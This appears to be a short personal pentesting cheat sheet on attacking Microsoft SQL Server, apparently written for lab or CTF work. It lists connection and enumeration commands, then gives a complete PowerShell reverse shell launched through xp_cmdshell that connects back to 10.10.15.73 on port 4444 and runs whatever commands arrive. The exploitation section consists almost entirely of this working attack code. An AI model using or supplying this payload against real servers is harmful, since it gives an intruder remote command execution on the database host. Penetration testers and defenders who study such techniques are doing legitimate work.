#database 
## Info
- **Type:** Relational Database Management System (RDBMS)
- **Common Usage:** Enterprise applications, web applications, Windows-based infrastructure
- **Security Note:** MSSQL servers may be vulnerable to **default credentials, weak authentication, XP_CMDSHELL abuse, and privilege escalation attacks**.

## Basic Commands
```bash
# Connect using authentication
mssqlclient.py $USER@$IP -windows-auth

# List databases
SELECT name FROM master.dbo.sysdatabases;

# Select a database
USE $DATABASE;

# List tables in the current database
SELECT * FROM information_schema.tables;

# List all users
SELECT name FROM master.sys.syslogins;

# Get current user
SELECT SYSTEM_USER;

# Checking Permissions
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## Exploitation
```

```

```sql
EXEC xp_cmdshell 'powershell.exe -ExecutionPolicy Bypass -Command "
    $client = New-Object System.Net.Sockets.TCPClient(''10.10.15.73'',4444);
    $stream = $client.GetStream();
    $bytes = New-Object byte[] 65535;

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
        $sendback = (iex $data 2>&1 | Out-String);
        $sendback2 = $sendback + ''# '';
        $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2);
        $stream.Write($sendbyte, 0, $sendbyte.Length);
        $stream.Flush();
    }

    $client.Close()
"';
```